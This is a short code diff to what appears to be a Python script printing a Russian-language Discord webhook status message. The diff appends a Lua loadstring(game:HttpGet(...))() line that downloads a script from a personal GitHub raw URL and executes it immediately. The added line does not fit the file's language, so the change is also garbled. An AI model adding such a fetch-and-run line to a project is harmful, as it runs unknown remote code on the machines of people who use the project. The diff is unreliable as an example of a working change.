@@ -551,3 +551,4 @@ print(
 print(
     '📱 Discord webhook готов к отправке уведомлений'
 )
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
